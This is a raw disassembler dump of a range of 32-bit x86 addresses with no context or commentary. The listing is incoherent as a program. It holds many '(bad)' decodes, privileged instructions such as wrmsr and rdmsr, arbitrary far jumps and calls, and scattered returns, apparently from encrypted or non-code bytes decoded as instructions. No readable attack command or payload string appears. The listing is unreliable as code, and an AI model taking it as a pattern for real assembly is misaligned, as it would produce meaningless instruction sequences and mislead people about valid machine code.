  414b49:	xor    ebx,DWORD PTR [ebx+0x262fa7a5]
  414b4f:	dec    eax
  414b50:	mov    ah,BYTE PTR [ebp-0x2a]
  414b53:	or     DWORD PTR [eax+0x51f1ee76],0xb1afbeb6
  414b5d:	sti    
  414b5e:	je     0x414ae5
  414b60:	cdq    
  414b61:	dec    edx
  414b62:	fsub   st,st(7)
  414b64:	mov    WORD PTR [eax-0x575e3719],ss
  414b6a:	and    bh,ah
  414b6c:	ror    DWORD PTR cs:[edi-0x46],cl
  414b70:	jmp    0x5638:0xf3343697
  414b77:	fisttp WORD PTR [edi]
  414b79:	push   0x20
  414b7b:	cld    
  414b7c:	xor    BYTE PTR [ebx-0x78],dl
  414b7f:	popf   
  414b80:	jmp    0xb0633367
  414b85:	xchg   esi,eax
  414b86:	adc    ecx,DWORD PTR [edi-0x41]
  414b89:	xor    ch,0xab
  414b8c:	cmp    al,bl
  414b8e:	out    0x6,eax
  414b90:	add    edx,edi
  414b92:	pushf  
  414b93:	popf   
  414b94:	mov    esp,DWORD PTR [ecx-0x33c096c6]
  414b9a:	dec    eax
  414b9b:	lods   eax,DWORD PTR ds:[esi]
  414b9c:	jbe    0x414c08
  414b9e:	outs   dx,DWORD PTR ds:[esi]
  414b9f:	nop
  414ba0:	dec    ecx
  414ba1:	cmp    al,0xb8
  414ba3:	dec    ecx
  414ba4:	push   0xbee1609f
  414ba9:	xor    DWORD PTR [ebx+0x57d75ba0],edi
  414baf:	ins    BYTE PTR es:[edi],dx
  414bb0:	adc    ebp,DWORD PTR [ecx-0x243c73e1]
  414bb6:	inc    edi
  414bb7:	ret    
  414bb8:	(bad)
  414bbb:	inc    esi
  414bbc:	test   BYTE PTR [eax-0x73],dh
  414bbf:	bound  eax,QWORD PTR [edi]
  414bc1:	sbb    ah,BYTE PTR [ecx+0x74314ace]
  414bc7:	mov    eax,ds:0x330d0265
  414bcc:	jno    0x414b5c
  414bce:	cmp    eax,0x894c1aed
  414bd3:	inc    edx
  414bd4:	data16 daa 
  414bd6:	or     dl,BYTE PTR [edi-0x1e]
  414bd9:	sti    
  414bda:	test   eax,0xca73dff3
  414bdf:	ja     0x414b7a
  414be1:	add    cl,dh
  414be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be4:	les    ebx,FWORD PTR [esi+0x1]
  414be7:	inc    esi
  414be8:	fist   WORD PTR [ecx]
  414bea:	and    BYTE PTR [ebx-0x41a8eae6],0x35
  414bf1:	ds pop ebp
  414bf3:	outs   dx,BYTE PTR gs:[esi]
  414bf5:	xchg   BYTE PTR [ebx],bl
  414bf7:	ret    
  414bf8:	mov    ch,0xaa
  414bfa:	test   BYTE PTR [esi-0x60ddc8fd],bh
  414c00:	test   eax,0x944486ca
  414c05:	outs   dx,DWORD PTR ds:[esi]
  414c06:	stc    
  414c07:	add    al,0x40
  414c09:	mov    BYTE PTR [ebx+0x4a],0x17
  414c0d:	retf   0xed7a
  414c10:	jp     0x414b98
  414c12:	imul   esi,DWORD PTR [ebp+0x589a6b21],0xa47eae36
  414c1c:	ret    0xc5eb
  414c1f:	add    ebx,esi
  414c21:	xchg   edx,eax
  414c22:	mov    BYTE PTR [edi+eax*2],bl
  414c25:	sub    al,0x9e
  414c27:	xchg   ebp,eax
  414c28:	(bad)  
  414c29:	bound  ebp,QWORD PTR [esp+esi*2]
  414c2c:	dec    ebx
  414c2d:	fisttp QWORD PTR [edi]
  414c2f:	xchg   ebp,eax
  414c30:	mov    eax,0xa0dac15a
  414c35:	mov    al,0xf6
  414c37:	push   edi
  414c38:	push   edx
  414c39:	xlat   BYTE PTR ds:[ebx]
  414c3a:	daa    
  414c3b:	popf   
  414c3c:	mov    esp,DWORD PTR ds:0xd176ee60
  414c42:	sbb    eax,0xd0028d8d
  414c47:	push   edi
  414c48:	nop
  414c49:	xchg   BYTE PTR [eax],bl
  414c4b:	mov    al,ds:0x725ea79e
  414c50:	pop    edi
  414c51:	(bad)  
  414c52:	wrmsr  
  414c54:	addr16 inc eax
  414c56:	adc    DWORD PTR [edi*1+0x2bcb384c],esp
  414c5d:	sbb    al,0x15
  414c5f:	inc    edx
  414c60:	xchg   ebx,eax
  414c61:	add    ah,BYTE PTR [ecx+0x5c]
  414c64:	aaa    
  414c65:	repnz adc ecx,DWORD PTR [esp+esi*1-0x46]
  414c6a:	mov    al,0x4b
  414c6c:	xchg   bp,ax
  414c6e:	aas    
  414c6f:	inc    ecx
  414c70:	fwait
  414c71:	push   eax
  414c72:	sub    eax,0xe9bff214
  414c77:	jl     0x414cc8
  414c79:	scas   eax,DWORD PTR es:[di]
  414c7b:	enter  0x7be,0xd4
  414c7f:	mov    esp,0xb87c2c14
  414c84:	nop
  414c85:	dec    ecx
  414c86:	jnp    0x414c4e
  414c88:	mov    ecx,0x4b33b7ca
  414c8d:	ret    
  414c8e:	jae    0x414c63
  414c90:	push   edx
  414c91:	sbb    DWORD PTR [ebp+0x124cd87c],ebp
  414c97:	mov    ds:0xa38a2262,al
  414c9c:	sub    BYTE PTR [edx+0x25812f16],al
  414ca2:	aad    0x85
  414ca4:	mov    al,ds:0xc7fbc34d
  414ca9:	jle    0x414cc0
  414cab:	addps  xmm0,XMMWORD PTR [edi]
  414cae:	mov    BYTE PTR ds:0x9eb6c181,dl
  414cb4:	xor    al,0x3e
  414cb6:	push   eax
  414cb7:	dec    ecx
  414cb8:	sub    eax,0xcaa73446
  414cbd:	cmp    BYTE PTR [edi-0xb3fed38],cl
  414cc3:	pop    eax
  414cc4:	jbe    0x414d32
  414cc6:	xor    BYTE PTR [ecx-0x3d],bh
  414cc9:	pop    edi
  414cca:	int    0x9b
  414ccc:	gs leave 
  414cce:	mov    edx,0xa11218a1
  414cd3:	aam    0x4f
  414cd5:	push   eax
  414cd6:	mov    edi,0xa11ff2a7
  414cdb:	iret   
  414cdc:	iret   
  414cdd:	lea    edx,[edx]
  414cdf:	mov    ecx,0x6162d0f4
  414ce4:	mov    ah,0x85
  414ce6:	jl     0x414ca7
  414ce8:	mov    al,0x62
  414cea:	inc    esp
  414ceb:	jl     0x414cf0
  414ced:	jge    0x414cab
  414cef:	shl    DWORD PTR [edx+ebx*4+0x76],1
  414cf3:	div    BYTE PTR ds:0x277d739b
  414cf9:	xor    BYTE PTR [ecx+0x7aea2104],0x59
  414d00:	lods   eax,DWORD PTR ds:[esi]
  414d01:	xchg   edi,eax
  414d02:	iret   
  414d03:	je     0x414d36
  414d05:	xchg   esi,eax
  414d06:	pop    edx
  414d07:	sbb    al,0x1b
  414d09:	dec    ecx
  414d0a:	pushf  
  414d0b:	nop
  414d0c:	lock mov edx,0x9a8e3981
  414d12:	inc    ecx
  414d13:	dec    ecx
  414d14:	mov    edx,0xf2bb0787
  414d19:	mov    ecx,0x603d41bc
  414d1e:	adc    bh,BYTE PTR [edi+0x64]
  414d21:	sub    bl,BYTE PTR [ebx+0x17]
  414d24:	aad    0x7d
  414d26:	xchg   edi,eax
  414d27:	ds int3 
  414d29:	mov    dh,0x89
  414d2b:	cmp    eax,0xad4bdc05
  414d30:	or     bl,al
  414d32:	pop    ds
  414d33:	int    0x37
  414d35:	cs jmp 0xed1c3549
  414d3b:	push   edx
  414d3c:	or     eax,0xf322b86c
  414d41:	push   cs
  414d42:	pusha  
  414d43:	pop    ecx
  414d44:	cmp    BYTE PTR [ebx],0x46
  414d47:	std    
  414d48:	push   edx
  414d49:	ins    BYTE PTR es:[edi],dx
  414d4a:	inc    eax
  414d4b:	scas   al,BYTE PTR es:[edi]
  414d4c:	xor    dh,BYTE PTR ds:0x69154825
  414d52:	scas   al,BYTE PTR es:[edi]
  414d53:	dec    eax
  414d54:	or     bh,BYTE PTR [edx+0x72]
  414d57:	cmp    BYTE PTR [ecx+edx*1],0x8
  414d5b:	and    eax,0xf78d65a5
  414d60:	sub    al,0xcf
  414d62:	sbb    BYTE PTR [esp],bl
  414d65:	or     al,dh
  414d67:	cld    
  414d68:	scas   eax,DWORD PTR es:[edi]
  414d69:	lahf   
  414d6a:	in     eax,0xac
  414d6c:	jg     0x414d34
  414d6e:	xchg   ebp,eax
  414d6f:	cmc    
  414d70:	hlt    
  414d71:	adc    cl,BYTE PTR [ecx-0x57]
  414d74:	(bad)  
  414d75:	sbb    dh,BYTE PTR [ecx+0x2fdea8db]
  414d7b:	xor    eax,0x95bf760e
  414d80:	and    al,0x5
  414d82:	inc    ebx
  414d83:	scas   al,BYTE PTR es:[edi]
  414d84:	aaa    
  414d85:	test   al,0x60
  414d87:	jnp    0x414de8
  414d89:	rcl    dh,cl
  414d8b:	mov    ds:0x4d7ffdda,al
  414d90:	mov    esi,ss
  414d92:	aaa    
  414d93:	retf   0xbdb7
  414d96:	jge    0x414d73
  414d98:	lods   al,BYTE PTR ds:[esi]
  414d99:	push   0xffffffd8
  414d9b:	xor    al,0xf1
  414d9d:	hlt    
  414d9e:	cdq    
  414d9f:	jg     0x414d8a
  414da1:	test   al,0xb1
  414da3:	(bad)  
  414da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414da5:	ss xchg ebp,eax
  414da7:	out    dx,eax
  414da8:	xlat   BYTE PTR ds:[ebx]
  414da9:	mov    al,0x76
  414dab:	frstor [edi+0x59f4c019]
  414db1:	rdmsr  
  414db3:	xchg   ebp,esi
  414db5:	jne    0x414daf
  414db7:	mov    ds:0x9e94a20,eax
  414dbc:	pop    ebp
  414dbd:	mov    al,ds:0x61fa3112
  414dc2:	jl     0x414e04
  414dc4:	xchg   ebp,eax
  414dc5:	or     dh,dh
  414dc7:	and    eax,0xffa5bbf
  414dcc:	push   esp
  414dcd:	inc    edi
  414dce:	xor    BYTE PTR [edi],ah
  414dd0:	leave  
  414dd1:	shl    dl,1
  414dd3:	adc    al,BYTE PTR [ebp-0x4e]
  414dd6:	loop   0x414dc9
  414dd8:	jecxz  0x414d60
  414dda:	lods   eax,DWORD PTR ds:[esi]
  414ddb:	jbe    0x414da4
  414ddd:	inc    esp
  414dde:	in     al,0x2b
  414de0:	call   0x9d9b:0x3772bcbf
  414de7:	aam    0x1d
  414de9:	into   
  414dea:	jg     0x414dfe
  414dec:	ret    
  414ded:	cld    
  414dee:	and    cl,dl
  414df0:	jmp    0x7bedd45a
  414df5:	call   0xc939:0xd5077109
  414dfc:	and    eax,0xde32fb34
  414e01:	in     al,dx
  414e02:	int3   
  414e03:	xchg   BYTE PTR [eax-0x1b2137e7],cl
  414e09:	outs   dx,DWORD PTR ds:[esi]
  414e0a:	cmp    dh,ch
  414e0c:	jae    0x414e57
  414e0e:	mov    edx,DWORD PTR [edx]
  414e10:	in     eax,0xfe
  414e12:	loope  0x414e09
  414e14:	mov    ecx,0x8e4a9e0d
  414e19:	pop    edx
  414e1a:	lods   eax,DWORD PTR ds:[esi]
  414e1b:	mov    cs,WORD PTR [edi]
  414e1d:	fcomi  st,st(4)
  414e1f:	out    0x9d,eax
  414e21:	cmp    BYTE PTR [ebx-0x5e1d2ce0],dh
  414e27:	clc    
  414e28:	call   0xa011d31c
  414e2d:	pop    es
  414e2e:	jle    0x414e38
  414e30:	sub    eax,0xaa357367
  414e35:	mov    ebp,0x64fdadc9
  414e3a:	icebp  
  414e3b:	iret   
  414e3c:	jbe    0x414eb9
  414e3e:	popf   
  414e3f:	push   ebp
  414e40:	jp     0x414e1c
  414e42:	js     0x414e71
  414e44:	jo     0x414e0d
  414e46:	ja     0x414e44
  414e48:	lea    ecx,[edx+0x443fc252]
  414e4e:	xchg   BYTE PTR [edx],ch
  414e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e51:	ret    0x12f3
  414e54:	pop    ebp
  414e55:	jmp    0x414dfc
  414e57:	mov    ecx,DWORD PTR [edi+edi*2+0x2b979af4]
  414e5e:	cs xchg ebx,eax
  414e60:	je     0x414ea6
  414e62:	inc    ecx
  414e63:	mov    bh,0x5a
  414e65:	fwait
  414e66:	jb     0x414e27
  414e68:	in     al,dx
  414e69:	vpmacsww xmm12,xmm7,xmm4,xmm3
  414e6f:	das    
  414e70:	jg     0x414e2d
  414e72:	sub    eax,0x1dcc5c51
  414e77:	cli    
  414e78:	pushf  
  414e79:	ss pop ds
  414e7b:	inc    eax
  414e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e7d:	sbb    BYTE PTR [ebx],al
  414e7f:	mov    BYTE PTR [esi],al
  414e81:	pop    edi
  414e82:	rol    dl,0xeb
  414e85:	or     eax,0x4b392069
  414e8a:	jae    0x414e2e
  414e8c:	loopne 0x414ef2
  414e8e:	cmc    
  414e8f:	mov    al,0x7e
  414e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e92:	jl     0x414e2c
  414e94:	push   edi
  414e95:	test   al,0xb3
  414e97:	pop    ecx
  414e98:	or     al,0xfa
  414e9a:	and    al,0x23
  414e9c:	adc    al,0x66
  414e9e:	pop    ebx
  414e9f:	ret    
  414ea0:	std    
  414ea1:	cli    
  414ea2:	jmp    0x2c10d27a
  414ea7:	cmp    ebx,DWORD PTR [ecx+0x74e23b67]
  414ead:	into   
  414eae:	jle    0x414e39
  414eb0:	push   eax
  414eb1:	push   edx
  414eb2:	ins    BYTE PTR es:[edi],dx
  414eb3:	call   0x2c18c14b
  414eb8:	dec    ecx
  414eb9:	pop    ebx
  414eba:	imul   edx,DWORD PTR [eax+0x73],0x18
  414ebe:	mov    ch,0xfc
  414ec0:	leave  
  414ec1:	add    al,0xa2
  414ec3:	fadd   DWORD PTR [edi-0xa240e76]
  414ec9:	rcr    DWORD PTR [edx+0x472a5d47],1
  414ecf:	dec    esp
  414ed0:	mov    ecx,0xbc471000
  414ed5:	not    DWORD PTR es:[esi]
  414ed8:	aaa    
  414ed9:	cmp    eax,0xa394a4b2
  414ede:	jne    0x414f21
  414ee0:	mov    eax,ds:0xf4402958
  414ee5:	mov    dh,0x19
  414ee7:	mov    edi,0xe5b44bfc
  414eec:	call   0x97df:0x2b99bed
  414ef3:	mov    esp,0xc29876fc
  414ef8:	fimul  WORD PTR [edx+edx*4]
  414efb:	shl    BYTE PTR [edx+0x2fba92b5],1
  414f01:	bound  edx,QWORD PTR [ebp-0x941373c]
  414f07:	fistp  WORD PTR [esi+0xe]
  414f0a:	pop    esp
  414f0b:	mov    ebx,0x9710f802
  414f10:	add    eax,0xce724515
  414f15:	jl     0x414f1e
  414f17:	inc    ebx
  414f18:	mov    edx,DWORD PTR [ebp-0x2170211c]
  414f1e:	push   esi
  414f1f:	jbe    0x414f84
  414f21:	shl    DWORD PTR ds:0x61a98207,cl
  414f27:	ds cmp eax,0x162fc87c
  414f2d:	pop    edi
  414f2e:	ins    BYTE PTR es:[edi],dx
  414f2f:	xor    eax,0x407f8273
  414f34:	mov    ds:0x82e54c92,al
  414f39:	and    ebp,eax
  414f3b:	add    dh,BYTE PTR [edx-0x181ca4bc]
  414f41:	xrelease xchg DWORD PTR [edi-0x12],edx
  414f45:	mov    ebp,0xd31e5062
  414f4a:	or     eax,DWORD PTR [edx+edx*8+0x62a81c88]
  414f51:	ins    BYTE PTR es:[edi],dx
  414f52:	or     BYTE PTR [eax-0x3d],ah
  414f55:	mov    ah,0x8f
  414f57:	sub    ecx,DWORD PTR [eax+0x42b87331]
  414f5d:	icebp  
  414f5e:	xor    al,0x53
  414f60:	jle    0x414f8a
  414f62:	pop    es
  414f63:	push   ebp
  414f64:	or     al,0x4
  414f66:	add    esi,DWORD PTR [edx+0xc]
  414f69:	mov    esi,0x2b450af2
  414f6e:	aaa    
  414f6f:	mov    bl,0x65
  414f71:	pop    edx
  414f72:	cmc    
  414f73:	mov    al,ds:0x56a24bd7
  414f78:	jo     0x414fbd
  414f7a:	cdq    
  414f7b:	cmp    eax,0x81ff7f7d
  414f80:	xlat   BYTE PTR ds:[ebx]
  414f81:	adc    bl,BYTE PTR [edi+0x1ac2db9c]
  414f87:	or     al,0xd1
  414f89:	add    BYTE PTR [eax+0x35637a4f],bl
  414f8f:	ss out dx,eax
  414f91:	jg     0x414f99
  414f93:	aaa    
  414f94:	sbb    DWORD PTR [ebp+0xa],0xbdf5f0e1
  414f9b:	jmp    0x351a:0x60f92084
  414fa2:	jae    0x414fcf
  414fa4:	xchg   ebx,eax
  414fa5:	jle    0x414fea
  414fa7:	loopne 0x414fc3
  414fa9:	(bad)  
  414faa:	pop    eax
  414fab:	xchg   esi,eax
  414fac:	int3   
  414fad:	xchg   ebp,eax
  414fae:	inc    eax
  414faf:	fadd   st(0),st
  414fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb2:	inc    esi
  414fb3:	call   0x4b9d9dbf
  414fb8:	sbb    al,0x33
  414fba:	sbb    BYTE PTR [esi],bl
  414fbc:	sahf   
  414fbd:	loope  0x415030
  414fbf:	lds    edx,FWORD PTR [edx]
  414fc1:	(bad)  
  414fc2:	mul    BYTE PTR [eax+0x17313c24]
  414fc8:	cmp    BYTE PTR [eax+0x5988ef28],dh
  414fce:	xchg   BYTE PTR [edi+0x34],bl
  414fd1:	out    dx,al
  414fd2:	out    dx,eax
  414fd3:	dec    eax
  414fd4:	xor    bh,ch
  414fd6:	sbb    DWORD PTR [ebp+ebx*2+0x22],eax
  414fda:	jbe    0x414f8d
  414fdc:	xchg   edi,eax
  414fdd:	pusha  
  414fde:	mov    dh,0x60
  414fe0:	shr    DWORD PTR [edx-0x37bccac5],0x1
  414fe7:	push   0xbe553048
  414fec:	rcl    esi,cl
  414fee:	sbb    eax,0xa5eac22e
  414ff3:	aaa    
  414ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff5:	lods   al,BYTE PTR ds:[esi]
  414ff6:	jmp    0xed08316d
  414ffb:	stc    
  414ffc:	push   ecx
  414ffd:	je     0x415063
  414fff:	sub    esp,DWORD PTR [esi-0x296807d9]
  415005:	pop    ds
  415006:	cli    
  415007:	ss and eax,0xb4b47f5d
  41500d:	int    0x79
  41500f:	mov    ds:0x5ea39452,eax
  415014:	cmp    eax,ecx
  415016:	mov    DWORD PTR [ecx+0x1d3b287b],edi
  41501c:	cmp    bh,bl
  41501e:	xchg   edi,eax
  41501f:	test   eax,0xca3662af
  415024:	cmp    DWORD PTR [eax+edx*4],0x2405947b
  41502b:	pop    edi
  41502c:	inc    ebx
  41502d:	jbe    0x415023
  41502f:	fisub  WORD PTR [ebx+esi*4]
  415032:	cwde   
  415033:	inc    edx
  415034:	je     0x414fc1
  415036:	push   0x6cd628
  41503b:	xchg   esp,eax
  41503c:	mov    edx,0xe8029dd3
  415041:	xor    al,0x30
  415043:	loopne 0x415041
  415045:	retf   
  415046:	mov    ch,0xa9
  415048:	jbe    0x414fd2
  41504a:	je     0x415091
  41504c:	out    dx,al
  41504d:	pop    edi
  41504e:	mov    cl,0xe1
  415050:	push   ebx
  415051:	add    ecx,DWORD PTR [edx]
  415053:	out    dx,eax
  415054:	mov    ds:0x47b565a3,al
  415059:	scas   al,BYTE PTR es:[edi]
  41505a:	cdq    
  41505b:	sar    BYTE PTR [ecx+0x7264ca2],0xf9
  415062:	cmp    BYTE PTR [edx+0x31f86040],cl
  415068:	push   ebx
  415069:	xlat   BYTE PTR ds:[ebx]
  41506a:	add    bh,BYTE PTR [ebp-0x24]
  41506d:	sar    BYTE PTR gs:[edx+0x26],0xdb
  415072:	jle    0x4150b4
  415074:	inc    ebx
  415075:	jb     0x415072
  415077:	lods   eax,DWORD PTR ds:[esi]
  415078:	mov    eax,0x6c6584ca
  41507d:	enter  0xbe5c,0xc8
  415081:	(bad)  
  415082:	icebp  
  415083:	dec    edi
  415084:	sub    al,0xc2
  415086:	ins    DWORD PTR es:[edi],dx
  415087:	ja     0x415023
  415089:	inc    ecx
  41508a:	mov    dl,0x37
  41508c:	cmp    DWORD PTR [esi+0x37],eax
  41508f:	icebp  
  415090:	xlat   BYTE PTR ds:[ebx]
  415091:	std    
  415092:	ins    DWORD PTR es:[edi],dx
  415093:	xor    al,0x29
  415095:	add    DWORD PTR [edi+0x5c],edx
  415098:	xor    bh,BYTE PTR [eax-0x3894a2ab]
  41509e:	je     0x415065
  4150a0:	std    
  4150a1:	xchg   ebx,eax
  4150a2:	jnp    0x4150c1
  4150a4:	or     DWORD PTR [ebx+edi*2-0x39ff1cbf],esp
  4150ab:	xchg   ebx,eax
  4150ac:	adc    ah,dl
  4150ae:	les    ebx,FWORD PTR [edx-0x21]
  4150b1:	pop    eax
  4150b2:	loope  0x41504b
  4150b4:	aaa    
  4150b5:	cmp    eax,0xcede7c2d
  4150ba:	dec    DWORD PTR ds:0x3178dd4b
  4150c0:	mov    eax,0x4e753fe2
  4150c5:	jmp    0xc87b8bba
  4150ca:	in     al,0x42
  4150cc:	ins    BYTE PTR es:[edi],dx
  4150cd:	jnp    0x4150bc
  4150cf:	dec    eax
  4150d0:	dec    ebx
  4150d1:	ins    DWORD PTR es:[edi],dx
  4150d2:	(bad)  
  4150d3:	ja     0x415067
  4150d5:	jmp    0x45a0f2df
  4150da:	stc    
  4150db:	lods   eax,DWORD PTR ds:[esi]
  4150dc:	daa    
  4150dd:	or     dh,bh
  4150df:	addr16 xchg edi,eax
  4150e1:	push   edi
  4150e2:	sti    
  4150e3:	out    0xd,al
  4150e5:	or     al,0xae
  4150e7:	ss aad 0x83
  4150ea:	cwde   
  4150eb:	out    dx,eax
  4150ec:	xchg   ebp,eax
  4150ed:	and    DWORD PTR [esi+ebx*8+0x632719a6],esi
  4150f4:	xchg   esp,eax
  4150f5:	mov    bh,0xef
  4150f7:	jnp    0x4150e7
  4150f9:	leave  
  4150fa:	nop
  4150fb:	inc    ebp
  4150fc:	je     0x4150ae
  4150fe:	out    0xc,eax
  415100:	aas    
  415101:	icebp  
  415102:	or     al,0xca
  415104:	leave  
  415105:	clc    
  415106:	sbb    ecx,esi
  415108:	mov    al,ds:0xf356f482
  41510d:	push   0x60
  41510f:	cmp    al,0x21
  415111:	pop    es
  415112:	xor    al,0xc2
  415114:	sub    eax,0xbec75b5a
  415119:	(bad)  
  41511a:	mov    dh,0x9
  41511c:	inc    ebp
  41511d:	or     eax,0x59794bfd
  415122:	jle    0x4150de
  415124:	mov    edi,0x5390cbf3
  415129:	xor    DWORD PTR [esi],edx
  41512b:	mov    ch,0x37
  41512d:	xchg   edi,eax
  41512e:	or     esi,DWORD PTR [eax]
  415130:	test   eax,0xb492d532
  415135:	fist   DWORD PTR [ecx-0xb]
  415138:	(bad)  
  415139:	mov    esi,0x1f79509c
  41513e:	adc    esp,DWORD PTR [eax+0x4e5ea01d]
  415144:	push   eax
  415145:	out    0x38,al
  415147:	or     BYTE PTR [ebp-0x19],ah
  41514a:	push   ecx
  41514b:	pop    esi
  41514c:	jne    0xb0feb236
  415152:	mov    ebp,DWORD PTR [edi]
  415154:	ss out dx,eax
  415156:	and    al,0x0
  415158:	addr16 push esp
  41515a:	cmp    esp,ebx
  41515c:	jle    0x4150f9
  41515e:	clc    
  41515f:	dec    esp
  415160:	cmp    BYTE PTR [esi+edx*4+0x330b1a18],bh
  415167:	scas   al,BYTE PTR es:[edi]
  415168:	jb     0x41518a
  41516a:	(bad)  
  41516b:	and    bh,ah
  41516d:	popf   
  41516e:	shr    BYTE PTR [ecx],0xaf
  415171:	sbb    ebp,ebx
  415173:	fld    DWORD PTR [edx+0x73e1cd3d]
  415179:	ror    DWORD PTR [bp+si+0x3],cl
  41517d:	(bad)  
  41517e:	lds    esi,FWORD PTR [ecx-0x3e]
  415181:	imul   ecx,DWORD PTR [eax+edx*4+0x1437ea8f],0x524fdba2
  41518c:	popf   
  41518d:	add    BYTE PTR [edx-0x1f],al
  415190:	js     0x4151e6
  415192:	mov    eax,ds:0xff56c93e
  415197:	sub    ch,ah
  415199:	lock (bad) 
  41519b:	mov    ebp,0x1eb3391a
  4151a0:	inc    ecx
  4151a1:	push   esp
  4151a2:	js     0x4151c4
  4151a4:	comiss xmm1,DWORD PTR [esi]
  4151a7:	add    BYTE PTR [ebx-0x9ae1292],0xa3
  4151ae:	pop    ebp
  4151af:	int3   
  4151b0:	cli    
  4151b1:	push   ds
  4151b2:	dec    esp
  4151b3:	cld    
  4151b4:	push   esp
  4151b5:	mov    cl,al
  4151b7:	mov    bl,BYTE PTR [eax]
  4151b9:	mov    ah,0xbf
  4151bb:	int3   
  4151bc:	outs   dx,BYTE PTR ds:[esi]
  4151bd:	inc    edx
  4151be:	(bad)  
  4151bf:	daa    
  4151c0:	and    DWORD PTR [edi],esi
  4151c2:	push   ecx
  4151c3:	sbb    eax,0xd26f9818
  4151c8:	imul   esp,DWORD PTR [esi],0xfffffff5
  4151cb:	or     eax,0xc555b223
  4151d0:	mov    ch,0x3b
  4151d2:	add    dl,BYTE PTR [ebp-0x56]
  4151d5:	int3   
  4151d6:	cmp    ecx,esi
  4151d8:	adc    esp,esi
  4151da:	xlat   BYTE PTR ds:[ebx]
  4151db:	jmp    0x2bd1:0xad5b34f0
  4151e2:	mov    ecx,0xf02ea50b
  4151e7:	outs   dx,BYTE PTR ds:[esi]
  4151e8:	pop    ecx
  4151e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ea:	arpl   ax,bp
  4151ec:	in     al,0x47
  4151ee:	test   eax,0x2819af8d
  4151f3:	adc    si,WORD PTR [ebp-0x31]
  4151f7:	push   ebp
  4151f8:	mov    ebx,0xea66b596
  4151fd:	xchg   DWORD PTR [ebp+0x64ff73c4],esi
  415203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415204:	jno    0x415186
  415206:	call   0x30b1:0xce2863ad
  41520d:	jmp    0x94f7:0xa1edb51d
  415214:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415216:	retf   
  415217:	pop    eax
  415218:	mov    edx,DWORD PTR [ecx]
  41521a:	test   eax,0x2022d7a0
  41521f:	jg     0x415233
  415221:	dec    ebp
  415222:	mov    ecx,0x3ee45957
  415227:	inc    edx
  415228:	stos   DWORD PTR es:[edi],eax
  415229:	jno    0x415269
  41522b:	xor    bl,BYTE PTR [esi+0x55]
  41522e:	cli    
  41522f:	test   ebx,ebx
  415231:	iret   
  415232:	addr16 mov ah,0xb
  415235:	jg     0x4151e3
  415237:	adc    DWORD PTR ds:0x99f2137d,ebp
  41523d:	ret    
  41523e:	adc    dl,BYTE PTR [edi-0x68d8b0ca]
  415244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415245:	xor    ecx,ebx
  415247:	ds pusha 
  415249:	fs mov ebx,0x3afa0ea1
  41524f:	retf   
  415250:	pop    ss
  415251:	es pop es
  415253:	scas   eax,DWORD PTR es:[edi]
  415254:	call   0x28c0:0x8364ecf8
  41525b:	jne    0x415274
  41525d:	sub    dl,BYTE PTR [esi]
  41525f:	and    DWORD PTR [eax-0x27e84517],edi
  415265:	loop   0x41520c
  415267:	mov    dh,0x12
  415269:	in     al,0xd6
  41526b:	add    eax,DWORD PTR ds:0x2d95c623
  415271:	push   esi
  415272:	sbb    bh,BYTE PTR [esi]
  415274:	hlt    
  415275:	dec    edx
  415276:	ret    0xe279
  415279:	xchg   ecx,eax
  41527a:	pop    es
  41527b:	ins    DWORD PTR es:[edi],dx
  41527c:	sub    bl,ah
  41527e:	xor    eax,0xee414e5a
  415283:	test   al,0x82
  415285:	repz and al,0x91
  415288:	and    DWORD PTR [edx+0x1eab5b6c],eax
  41528e:	jp     0x41529a
  415290:	int3   
  415291:	test   eax,0x658be109
  415296:	idiv   esi
  415298:	inc    ebx
  415299:	scas   al,BYTE PTR es:[edi]
  41529a:	pushf  
  41529b:	mov    DWORD PTR [ebx+0x4bc09c],esi
  4152a1:	repz xor ebx,eax
  4152a4:	jns    0x4152ec
  4152a6:	aad    0x8e
  4152a8:	pop    edi
  4152a9:	sub    eax,0x630f9dd5
  4152ae:	adc    bh,bl
  4152b0:	dec    esp
  4152b1:	fisttp DWORD PTR [edx]
  4152b3:	inc    ebp
  4152b4:	and    BYTE PTR [eax],ch
  4152b6:	out    dx,al
  4152b7:	data16 std 
  4152b9:	lods   al,BYTE PTR ds:[esi]
  4152ba:	pop    eax
  4152bb:	sbb    bh,BYTE PTR [edx-0x51]
  4152be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152bf:	adc    edi,DWORD PTR [ecx]
  4152c1:	cmp    bl,ah
  4152c3:	call   0x90b2:0xa1183d55
  4152ca:	mov    ecx,gs
  4152cc:	ds mov ah,bl
  4152cf:	mov    BYTE PTR [esi-0x7b],ah
  4152d2:	fs inc ecx
  4152d4:	sbb    al,0xc3
  4152d6:	jb     0x4152a4
  4152d8:	sahf   
  4152d9:	pusha  
  4152da:	lods   eax,DWORD PTR ds:[esi]
  4152db:	push   esp
  4152dc:	out    dx,eax
  4152dd:	loopne 0x4152bb
  4152df:	enter  0xbc82,0x3f
  4152e3:	pop    edi
  4152e4:	cmp    dh,BYTE PTR [ebx-0x2563f322]
  4152ea:	xchg   esp,eax
  4152eb:	cmp    BYTE PTR [ebp-0x24ae1e9f],dh
  4152f1:	mov    ss,WORD PTR [ebx]
  4152f3:	in     al,dx
  4152f4:	test   BYTE PTR [ebx],0x61
  4152f7:	mov    dl,0x26
  4152f9:	aas    
  4152fa:	jmp    0x9afd:0x4e5ffc7
  415301:	call   0x1b92:0xa44665f6
  415308:	adc    al,0xdb
  41530a:	xlat   BYTE PTR ds:[ebx]
  41530b:	lahf   
  41530c:	fxch   st(5)
  41530e:	iret   
  41530f:	adc    edi,DWORD PTR [ecx]
  415311:	fbld   TBYTE PTR [edx+0x12]
  415314:	aam    0x77
  415316:	dec    esp
  415317:	icebp  
  415318:	(bad)  
  415319:	jne    0x4152ba
  41531b:	repnz (bad) 
  41531d:	push   esi
